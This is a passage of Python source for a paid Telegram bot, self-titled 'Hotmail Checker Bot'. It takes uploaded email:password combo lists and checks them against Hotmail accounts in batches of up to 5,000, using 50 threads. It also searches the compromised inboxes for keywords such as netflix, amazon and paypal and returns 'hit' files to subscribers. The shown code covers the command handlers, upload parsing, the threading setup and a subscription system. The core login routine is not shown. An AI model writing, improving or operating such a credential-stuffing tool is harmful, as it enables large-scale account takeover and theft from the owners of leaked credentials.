            f"⚠️ **Task Already Running**\n\n"
            f"You already have an active task.\n"
            f"Use `/stop` to cancel it first or check status.\n\n"
            f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
            f"👑 **Configured by:** {OWNER_USERNAME}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
        return
    
    can_use, reason = await DatabaseManager.can_use_batch(user_id)
    if not can_use:
        await message.reply_text(
            f"❌ **Batch Limit Reached**\n\n"
            f"**Reason:** {reason}\n\n"
            f"**Free Users:** 5 batches/day\n"
            f"**Premium Users:** Higher limits\n\n"
            f"Use `/plans` to view subscription options\n"
            f"Contact {OWNER_USERNAME} to upgrade\n\n"
            f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
            f"👑 **Configured by:** {OWNER_USERNAME}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
        return
    
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply_text(
            f"📁 **Batch File Required**\n\n"
            f"**How to use batch check:**\n"
            f"1. Send me a `.txt` file with email:password combos\n"
            f"2. Reply to that file with `/batch target1 target2`\n\n"
            f"**File Format:**\n"
            f"```\nemail1:password1\nemail2:password2\nemail3:password3\n```\n\n"
            f"**Example:**\n"
            f"Reply to your file with:\n"
            f"`/batch netflix amazon paypal`\n\n"
            f"⚡ **50 threads will be used for faster processing!**\n"
            f"📦 **Files sent:** hit_{{target}}.txt & free.txt\n"
            f"📊 **Real-time hit counting**\n\n"
            f"🎫 **Your remaining batches today:**\n"
            f"Check with `/myplan`\n\n"
            f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
            f"👑 **Configured by:** {OWNER_USERNAME}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
        return
    
    args = message.text.split()[1:]
    if not args:
        await message.reply_text(
            f"🎯 **Targets Required**\n\n"
            f"Please specify targets to search for:\n"
            f"Example: `netflix amazon paypal`\n\n"
            f"Reply to the file with targets separated by space.\n\n"
            f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
            f"👑 **Configured by:** {OWNER_USERNAME}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
        return
    
    targets = args
    
    doc = message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        await message.reply_text(
            f"❌ **Invalid File Type**\n\n"
            f"Please send a `.txt` file.\n\n"
            f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
            f"👑 **Configured by:** {OWNER_USERNAME}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
        return
    
    try:
        download_path = await client.download_media(doc)
        
        async with aiofiles.open(download_path, 'r', encoding='utf-8') as f:
            content = await f.read()
        
        accounts = []
        for line in content.splitlines():
            line = line.strip()
            if ':' in line:
                email, password = line.split(':', 1)
                accounts.append((email.strip(), password.strip()))
        
        os.remove(download_path)
        
        if not accounts:
            await message.reply_text(
                f"❌ **No Valid Accounts**\n\n"
                f"No valid email:password combos found in the file.\n\n"
                f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
                f"👑 **Configured by:** {OWNER_USERNAME}",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=create_back_keyboard()
            )
            return
        
        # Limit batch size
        if len(accounts) > 5000:
            await message.reply_text(
                f"⚠️ **Too Many Accounts**\n\n"
                f"Maximum 5000 accounts per batch.\n"
                f"Your file has {len(accounts)} accounts.\n"
                f"Please split into smaller files.\n\n"
                f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
                f"👑 **Configured by:** {OWNER_USERNAME}",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        add_task(user_id, "batch", {
            "total_accounts": len(accounts),
            "targets": targets
        })
        
        asyncio.create_task(batch_worker(user_id, accounts, targets, message))
        
        await message.reply_text(
            f"⚡ **Batch Processing Started**\n\n"
            f"┌─────────────────────────┐\n"
            f"│ **Accounts**: {len(accounts)}\n"
            f"│ **Targets**: {', '.join(targets)}\n"
            f"│ **Threads**: 50 ⚡\n"
            f"│ **Status**: Initializing...\n"
            f"└─────────────────────────┘\n\n"
            f"{get_animation_frame()} **Starting 50 workers...**\n\n"
            f"📦 **Will send:** hit_{{target}}.txt & free.txt\n"
            f"📊 **Real-time hit counting enabled**\n\n"
            f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
            f"👑 **By:** {OWNER_USERNAME}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
        
    except Exception as e:
        logger.error(f"Batch command error: {e}")
        await message.reply_text(
            f"❌ **Error Processing File**\n\n"
            f"Error: `{str(e)}`\n\n"
            f"Please check the file format and try again.\n\n"
            f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
            f"👑 **Configured by:** {OWNER_USERNAME}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )

@app.on_message(filters.command("setplans") & filters.user(OWNER_ID))
async def set_plans_command(client, message: Message):
    """Set subscription plans (Admin only)"""
    user_id = message.from_user.id
    user = await DatabaseManager.get_user(user_id)
    username = user.get("username", "")
    full_name = user.get("full_name", "")
    is_premium = await DatabaseManager.is_premium(user_id)
    
    await message.reply_text(
        f"⚙️ **Set Subscription Plans**\n\n"
        f"**Current Plans:** Use `/plans` to view\n\n"
        f"**To add a new plan:**\n"
        f"Use: `/addplan Name Days Price DailyLimit`\n\n"
        f"**Example:**\n"
        f"`/addplan Premium 30 20USD 100`\n\n"
        f"**To remove a plan:**\n"
        f"`/rmvplan plan_id`\n\n"
        f"**Other admin commands:**\n"
        f"`/addpremium user_id plan_id`\n"
        f"`/stats` - Bot statistics\n"
        f"`/userlist` - User list\n"
        f"`/userinfo user_id`\n\n"
        f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
        f"👑 **Configured by:** {OWNER_USERNAME}",
        parse_mode=ParseMode.MARKDOWN
    )

@app.on_message(filters.command("addplan") & filters.user(OWNER_ID))
async def add_plan_command(client, message: Message):
    """Add new subscription plan (Admin only)"""
    args = message.text.split()[1:]
    if len(args) < 4:
        await message.reply_text(
            f"❌ **Invalid Format**\n\n"
            f"**Usage:**\n"
            f"`/addplan Name Days Price DailyLimit`\n\n"
            f"**Example:**\n"
            f"`/addplan Premium 30 20USD 100`\n\n"
            f"**Features:** Add features separated by comma\n"
            f"Example: `Feature1, Feature2, Feature3`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    try:
        name = args[0]
        days = int(args[1])
        price = args[2]
        batch_limit = int(args[3])
        
        features = []
        if len(args) > 4:
            features = [f.strip() for f in " ".join(args[4:]).split(",")]
        
        plan_data = {
            "name": name,
            "days": days,
            "price": price,
            "batch_limit": batch_limit,
            "features": features if features else [f"Daily {batch_limit} batch checks", "Priority processing"]
        }
        
        success = await DatabaseManager.add_plan(plan_data)
        
        if success:
            await message.reply_text(
                f"✅ **Plan Added Successfully**\n\n"
                f"**Name:** {name}\n"
                f"**Duration:** {days} days\n"
                f"**Price:** {price}\n"
                f"**Daily Limit:** {batch_limit} batches\n"
                f"**Features:**\n" + "\n".join(f"• {f}" for f in plan_data["features"]),
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            await message.reply_text("❌ Failed to add plan")
    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")

@app.on_message(filters.command("rmvplan") & filters.user(OWNER_ID))
async def remove_plan_command(client, message: Message):
    """Remove subscription plan (Admin only)"""
    args = message.text.split()[1:]
    if len(args) < 1:
        await message.reply_text(
            f"❌ **Invalid Format**\n\n"
            f"**Usage:**\n"
            f"`/rmvplan plan_id`\n\n"
            f"**Example:**\n"
            f"`/rmvplan 1`\n\n"
            f"Use `/plans` to see plan IDs",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    plan_id = args[0]
    success = await DatabaseManager.remove_plan(plan_id)
    
    if success:
        await message.reply_text(f"✅ Plan {plan_id} removed successfully")
    else:
        await message.reply_text(f"❌ Failed to remove plan {plan_id}")

@app.on_message(filters.command("addpremium") & filters.user(OWNER_ID))
async def add_premium_command(client, message: Message):
    """Add premium subscription to user (Admin only)"""
    args = message.text.split()[1:]
    if len(args) < 2:
        await message.reply_text(
            f"❌ **Invalid Format**\n\n"
            f"**Usage:**\n"
            f"`/addpremium user_id plan_id`\n\n"
            f"**Example:**\n"
            f"`/addpremium 123456789 2`\n\n"
            f"Use `/plans` to see plan IDs",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    try:
        user_id = int(args[0])
        plan_id = args[1]
        
        success, message_text = await DatabaseManager.add_subscription(user_id, plan_id)
        
        if success:
            plan = await DatabaseManager.get_plan(plan_id)
            if plan:
                await message.reply_text(
                    f"✅ **Premium Added Successfully**\n\n"
                    f"**User ID:** {user_id}\n"
                    f"**Plan:** {plan['name']}\n"
                    f"**Duration:** {plan['days']} days\n"
                    f"**Price:** {plan['price']}\n"
                    f"**Daily Limit:** {plan['batch_limit']} batches\n\n"
                    f"{message_text}",
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                await message.reply_text(f"✅ {message_text}")
        else:
            await message.reply_text(f"❌ {message_text}")
    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")

@app.on_message(filters.command("stats") & filters.user(OWNER_ID))
async def stats_command(client, message: Message):
    """Get bot statistics (Admin only)"""
    try:
        stats = await DatabaseManager.get_bot_stats()
        
        if not stats:
            await message.reply_text("❌ Failed to get statistics")
            return
        
        stats_text = "📊 **Bot Statistics**\n\n"
        stats_text += f"┌─────────────────────────┐\n"
        stats_text += f"│ **Total Users**: {stats['total_users']}\n"
        stats_text += f"│ **Active Premium**: {stats['active_subscriptions']}\n"
        stats_text += f"│ **Free Users**: {stats['free_users']}\n"
        stats_text += f"│ **Total Checks**: {stats['total_checks']}\n"
        stats_text += f"│ **Total Batches**: {stats['total_batches']}\n"
        stats_text += f"│ **Total Hits**: {stats['total_hits']}\n"
        stats_text += f"│ **Timestamp**: {stats['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}\n"
        stats_text += f"└─────────────────────────┘\n\n"
        
        filename = f"bot_stats_{int(time.time())}.txt"
        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
            await f.write(stats_text)
        
        await message.reply_document(
            filename,
            caption="📊 Bot Statistics"
        )
        
        os.remove(filename)
        
    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")

@app.on_message(filters.command("userlist") & filters.user(OWNER_ID))
async def userlist_command(client, message: Message):
    """Get user list (Admin only)"""
    try:
        users = await DatabaseManager.get_all_users()
        
        if not users:
            await message.reply_text("📭 No users found")
            return
        
        userlist_text = "👥 **User List**\n\n"
        
        for i, user in enumerate(users[:100], 1):
            user_id = user.get("_id", "N/A")
            subscription = user.get("subscription", {})
            plan_name = subscription.get("plan_name", "Free")
            join_date = user.get("join_date", "")
            
            if isinstance(join_date, datetime):
                join_date = join_date.strftime('%Y-%m-%d')
            
            userlist_text += f"{i}. **ID:** {user_id} | **Plan:** {plan_name} | **Joined:** {join_date}\n"
        
        if len(users) > 100:
            userlist_text += f"\n... and {len(users) - 100} more users"
        
        filename = f"userlist_{int(time.time())}.txt"
        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
            await f.write(userlist_text)
        
        await message.reply_document(
            filename,
            caption=f"👥 Total Users: {len(users)}"
        )
        
        os.remove(filename)
        
    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")

@app.on_message(filters.command("userinfo"))
async def userinfo_command(client, message: Message):
    """Get user information"""
    user_id = message.from_user.id
    user = await DatabaseManager.get_user(user_id)
    username = user.get("username", "")
    full_name = user.get("full_name", "")
    is_premium = await DatabaseManager.is_premium(user_id)
    
    args = message.text.split()[1:]
    
    if args and message.from_user.id == OWNER_ID:
        try:
            target_id = int(args[0])
            target_user = await DatabaseManager.get_user(target_id)
            target_username = target_user.get("username", "")
            target_full_name = target_user.get("full_name", "")
            target_is_premium = await DatabaseManager.is_premium(target_id)
        except:
            await message.reply_text("❌ Invalid user ID")
            return
    else:
        target_user = user
        target_id = user_id
        target_username = username
        target_full_name = full_name
        target_is_premium = is_premium
    
    if not target_user:
        await message.reply_text("❌ User not found")
        return
    
    subscription = target_user.get("subscription", {})
    stats = target_user.get("stats", {})
    
    info_text = f"👤 **User Information**\n\n"
    info_text += f"┌─────────────────────────┐\n"
    info_text += f"│ **User ID**: {target_user.get('_id')}\n"
    info_text += f"│ **Plan**: {subscription.get('plan_name', 'Free')}\n"
    
    if subscription.get('plan_id'):
        expiry_date = subscription.get('expiry_date')
        if expiry_date:
            if datetime.utcnow() > expiry_date:
                info_text += f"│ **Status**: ❌ Expired\n"
            else:
                remaining = expiry_date - datetime.utcnow()
                days = remaining.days
                hours = int(remaining.seconds // 3600)
                info_text += f"│ **Expires In**: {days}d {hours}h\n"
    
    info_text += f"│ **Daily Limit**: {subscription.get('batch_limit', FREE_DAILY_BATCH_LIMIT)}\n"
    info_text += f"│ **Used Today**: {subscription.get('used_batch_today', 0)}\n"
    info_text += f"│ **Join Date**: {target_user.get('join_date', 'N/A').strftime('%Y-%m-%d') if isinstance(target_user.get('join_date'), datetime) else 'N/A'}\n"
    info_text += f"│ **Last Active**: {stats.get('last_active', 'Never').strftime('%Y-%m-%d %H:%M') if isinstance(stats.get('last_active'), datetime) else 'Never'}\n"
    info_text += f"└─────────────────────────┘\n\n"
    
    info_text += f"📊 **Statistics**\n"
    info_text += f"┌─────────────────────────┐\n"
    info_text += f"│ **Total Checks**: {stats.get('total_checks', 0)}\n"
    info_text += f"│ **Total Batches**: {stats.get('total_batches', 0)}\n"
    info_text += f"│ **Total Hits**: {stats.get('total_hits', 0)}\n"
    info_text += f"└─────────────────────────┘\n\n"
    
    info_text += f"{format_checked_by(target_id, target_username, target_full_name, target_is_premium)}\n"
    
    if message.from_user.id == OWNER_ID and args:
        info_text += f"\n👑 **Admin View**"
    
    info_text += f"\n👑 **Configured by:** {OWNER_USERNAME}"
    
    await message.reply_text(info_text, parse_mode=ParseMode.MARKDOWN)

@app.on_message(filters.command("plans"))
async def plans_command(client, message: Message):
    """View subscription plans"""
    user_id = message.from_user.id
    user = await DatabaseManager.get_user(user_id)
    username = user.get("username", "")
    full_name = user.get("full_name", "")
    is_premium = await DatabaseManager.is_premium(user_id)
    
    plans = await DatabaseManager.get_all_plans()
    
    if not plans:
        plans_text = "📭 **No Plans Available**\n\nContact admin to set up plans."
    else:
        plans_text = "💎 **Available Subscription Plans**\n\n"
        
        for i, plan in enumerate(plans, 1):
            plans_text += f"**{i}. {plan['name']}**\n"
            plans_text += f"   ├ **Duration**: {plan['days']} days\n"
            plans_text += f"   ├ **Price**: {plan['price']}\n"
            plans_text += f"   ├ **Daily Limit**: {plan['batch_limit']} batches\n"
            plans_text += f"   ├ **ID**: `{plan['_id']}`\n"
            plans_text += f"   └ **Features**:\n"
            
            for feature in plan.get('features', []):
                plans_text += f"      • {feature}\n"
            
            plans_text += "\n"
    
    plans_text += "\n🎫 **Free Plan**: 5 batches/day\n"
    plans_text += f"📞 **Contact owner for purchase:**\n"
    plans_text += f"{OWNER_USERNAME}\n\n"
    plans_text += f"Use `/myplan` to check your current plan\n\n"
    plans_text += f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
    plans_text += f"👑 **Configured by:** {OWNER_USERNAME}"
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🎫 My Plan", callback_data="my_plan")],
        [InlineKeyboardButton("🔙 Menu", callback_data="back_to_menu")]
    ])
    
    await message.reply_text(
        plans_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=keyboard
    )

@app.on_message(filters.command("myplan"))
async def myplan_command(client, message: Message):
    """Check user's subscription plan"""
    user_id = message.from_user.id
    user = await DatabaseManager.get_user(user_id)
    
    if user:
        subscription = user.get("subscription", {})
        stats = user.get("stats", {})
        username = user.get("username", "")
        full_name = user.get("full_name", "")
        is_premium = await DatabaseManager.is_premium(user_id)
        
        expiry_date = subscription.get("expiry_date")
        if expiry_date and datetime.utcnow() > expiry_date:
            await DatabaseManager.remove_subscription(user_id)
            subscription = {
                "plan_name": "Free",
                "batch_limit": FREE_DAILY_BATCH_LIMIT,
                "used_batch_today": 0
            }
            is_premium = False
        
        plan_text = f"🎫 **Your Subscription Plan**\n\n"
        plan_text += f"┌─────────────────────────┐\n"
        plan_text += f"│ **Plan**: {subscription.get('plan_name', 'Free')}\n"
        
        if subscription.get('plan_id'):
            if expiry_date:
                if datetime.utcnow() > expiry_date:
                    plan_text += f"│ **Status**: ❌ Expired\n"
                else:
                    remaining = expiry_date - datetime.utcnow()
                    days = remaining.days
                    hours = int(remaining.seconds // 3600)
                    plan_text += f"│ **Expires In**: {days}d {hours}h\n"
        else:
            plan_text += f"│ **Type**: Free User\n"
        
        plan_text += f"│ **Daily Limit**: {subscription.get('batch_limit', FREE_DAILY_BATCH_LIMIT)}\n"
        plan_text += f"│ **Used Today**: {subscription.get('used_batch_today', 0)}\n"
        plan_text += f"│ **Remaining**: {subscription.get('batch_limit', FREE_DAILY_BATCH_LIMIT) - subscription.get('used_batch_today', 0)}\n"
        plan_text += f"└─────────────────────────┘\n\n"
        
        plan_text += f"📊 **Your Statistics**\n"
        plan_text += f"┌─────────────────────────┐\n"
        plan_text += f"│ **Total Checks**: {stats.get('total_checks', 0)}\n"
        plan_text += f"│ **Total Batches**: {stats.get('total_batches', 0)}\n"
        plan_text += f"│ **Total Hits**: {stats.get('total_hits', 0)}\n"
        plan_text += f"│ **Last Active**: {stats.get('last_active', 'Never').strftime('%Y-%m-%d %H:%M') if isinstance(stats.get('last_active'), datetime) else 'Never'}\n"
        plan_text += f"└─────────────────────────┘\n\n"
        
        plan_text += f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
        
        if not subscription.get('plan_id'):
            plan_text += f"\n💎 **Upgrade for more features!**\n"
            plan_text += f"Use /plans to see available plans\n"
        
        plan_text += f"👑 **Configured by:** {OWNER_USERNAME}"
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("💎 View Plans", callback_data="plans")],
            [InlineKeyboardButton("🔙 Menu", callback_data="back_to_menu")]
        ])
        
        await message.reply_text(
            plan_text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=keyboard
        )

@app.on_message(filters.command("stop"))
async def stop_command(client, message: Message):
    """Stop current task command"""
    user_id = message.from_user.id
    user = await DatabaseManager.get_user(user_id)
    username = user.get("username", "")
    full_name = user.get("full_name", "")
    is_premium = await DatabaseManager.is_premium(user_id)
    
    if stop_user_task(user_id):
        await message.reply_text(
            f"🛑 **Task Stopped Successfully**\n\n"
            f"Your current task has been terminated.\n\n"
            f"You can start a new task from the menu.\n\n"
            f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
            f"👑 **Configured by:** {OWNER_USERNAME}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
    else:
        await message.reply_text(
            f"ℹ️ **No Active Task**\n\n"
            f"You don't have any running task to stop.\n\n"
            f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
            f"👑 **Configured by:** {OWNER_USERNAME}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )

@app.on_message(filters.command("status"))
async def status_command(client, message: Message):
    """Check task status command"""
    user_id = message.from_user.id
    user = await DatabaseManager.get_user(user_id)
    username = user.get("username", "")
    full_name = user.get("full_name", "")
    is_premium = await DatabaseManager.is_premium(user_id)
    
    await send_thinking_animation(message.chat.id)
    
    if user_id in active_tasks:
        task = active_tasks[user_id]
        elapsed = time.time() - task["start_time"]
        
        status_text = (
            f"📊 **Task Status**\n\n"
            f"┌─────────────────────────┐\n"
            f"│ **Type**: {task['type'].upper()}\n"
            f"│ **Status**: {'✅ Running' if task.get('running', True) else '🛑 Stopped'}\n"
            f"│ **Duration**: {elapsed:.1f}s\n"
        )
        
        if task["type"] == "batch":
            status_text += f"│ **Accounts**: {task['data'].get('total_accounts', 'N/A')}\n"
            status_text += f"│ **Targets**: {', '.join(task['data'].get('targets', []))}\n"
            status_text += f"│ **Threads**: 50 ⚡\n"
        
        status_text += f"└─────────────────────────┘\n\n"
        status_text += f"{get_animation_frame()} **Working...**\n\n"
        status_text += f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
        status_text += f"👑 **Configured by:** {OWNER_USERNAME}"
        
    else:
        status_text = (
            f"📊 **Task Status**\n\n"
            f"ℹ️ **No active task found.**\n\n"
            f"Start a new task from the main menu.\n\n"
            f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
            f"👑 **Configured by:** {OWNER_USERNAME}"
        )
    
    await message.reply_text(
        status_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=create_back_keyboard()
    )

@app.on_message(filters.command("help"))
async def help_command(client, message: Message):
    """Help command handler"""
    user_id = message.from_user.id
    user = await DatabaseManager.get_user(user_id)
    username = user.get("username", "")
    full_name = user.get("full_name", "")
    is_premium = await DatabaseManager.is_premium(user_id)
    
    help_text = (
        f"📖 **Help & Instructions**\n\n"
        f"**Available Commands:**\n"
        f"• `/check email:pass target1 target2` - Single account check (FREE)\n"
        f"• `/batch` - Batch check (reply to .txt file) (Subscription)\n"
        f"• `/plans` - View subscription plans\n"
        f"• `/myplan` - Check your subscription\n"
        f"• `/stop` - Stop current task\n"
        f"• `/status` - Check task status\n\n"
        f"**Features:**\n"
        f"• Real-time hit notifications 🎯\n"
        f"• Profile extraction 📋\n"
        f"• Inbox search for targets 🔍\n"
        f"• Batch processing with 50 threads ⚡\n"
        f"• Free: 5 batches/day\n"
        f"• Premium: Higher limits 💎\n"
        f"• Real-time hit counting 📊\n"
        f"• Copy button for easy copying 📋\n"
        f"• Automatic file cleanup 🧹\n\n"
        f"**Need Help?**\n"
        f"Contact: {OWNER_USERNAME}\n\n"
        f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
        f"👑 **Configured by:** {OWNER_USERNAME}\n\n"
        f"{format_credits()}"
    )
    
    await message.reply_text(
        help_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=create_back_keyboard()
    )

# Main function
async def main():
    """Main function to run the bot"""
    logger.info("Starting Hotmail Checker Bot...")
    
    await DatabaseManager.initialize_database()
    
    banner = """
    ┌─────────────────────────────┐
    │   HOTMAIL CHECKER BOT v3.0  │
    │    Premium Edition          │
    │      50 THREADS MODE ⚡     │
    │   SUBSCRIPTION SYSTEM       │
    │  REAL-TIME HIT COUNTING 📊  │
    │    AUTO CLEANUP ENABLED     │
    └─────────────────────────────┘
    """
    print(banner)
    
    await app.start()
    
    bot_info = await app.get_me()
    logger.info(f"Bot started: @{bot_info.username}")
    logger.info(f"Owner: {OWNER_USERNAME}")
    logger.info(f"Max Threads: {MAX_THREADS}")
    logger.info(f"Free Daily Limit: {FREE_DAILY_BATCH_LIMIT}")
    
    try:
        await app.send_message(
            OWNER_ID,
            f"🤖 **Bot Started Successfully!**\n\n"
            f"• Bot: @{bot_info.username}\n"
            f"• Threads: {MAX_THREADS} ⚡\n"
            f"• Free Limit: {FREE_DAILY_BATCH_LIMIT}/day\n"
            f"• Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"• Status: ✅ Online\n"
            f"• Premium System: ✅ Active\n"
            f"• Hit Counting: ✅ Enabled\n\n"
            f"👑 **Configured by:** {OWNER_USERNAME}",
            parse_mode=ParseMode.MARKDOWN
        )
    except Exception as e:
        logger.warning(f"Could not send startup notification: {e}")
    
    await asyncio.Event().wait()

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    finally:
        loop.run_until_complete(app.stop())
        loop.close()
